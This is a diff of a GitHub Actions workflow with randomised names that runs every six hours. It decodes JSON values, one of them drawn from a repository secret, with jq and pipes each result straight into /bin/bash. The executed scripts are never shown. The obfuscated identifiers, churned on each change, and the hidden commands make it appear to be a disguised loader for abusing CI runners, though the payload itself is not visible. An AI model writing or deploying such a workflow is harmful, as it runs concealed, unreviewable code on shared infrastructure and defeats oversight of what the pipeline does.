@@ -1,28 +1,24 @@
 name: huanlxh
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 5/6 * * *'
-
-jobs:  # 22196
+    - cron: '53 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: huanlxh
         env:
-          xtfy3: ${{ secrets.xtfy3 }}
+          dsxv4: ${{ secrets.dsxv4 }}
         run: |
-          echo $xtfy3 | jq -r .cyj1925 | /bin/bash
-          echo $p35182 | jq -r .f47 | /bin/bash
-          echo $dy2539 | jq -r .qq41679 | /bin/bash
-          echo $dc7 | jq -r .ycl3 | /bin/bash
-          echo $dil74644 | jq -r .hxtll2 | /bin/bash
-          echo $bbjww21 | jq -r .fh84 | /bin/bash
-          echo $oqlaa943 | jq -r .fll0 | /bin/bash
-          echo $hx6 | jq -r .yohm1 | /bin/bash
-          echo $qc62658 | jq -r .uoeds80 | /bin/bash
-          echo $e72966 | jq -r .mj8 | /bin/bash
-          echo $rbi8 | jq -r .obi0095 | /bin/bash
+          echo $dsxv4 | jq -r .o542 | /bin/bash
+          echo $xy211 | jq -r .gcu333 | /bin/bash
+          echo $qb610 | jq -r .v93804 | /bin/bash
+          echo $i5 | jq -r .leij8 | /bin/bash
+          echo $we85 | jq -r .t278 | /bin/bash
+          echo $dilon083 | jq -r .s464 | /bin/bash
+          echo $vfg4 | jq -r .ox29033 | /bin/bash
+          echo $hutsh504 | jq -r .q1 | /bin/bash
+          echo $vbza29242 | jq -r .kv725 | /bin/bash
 
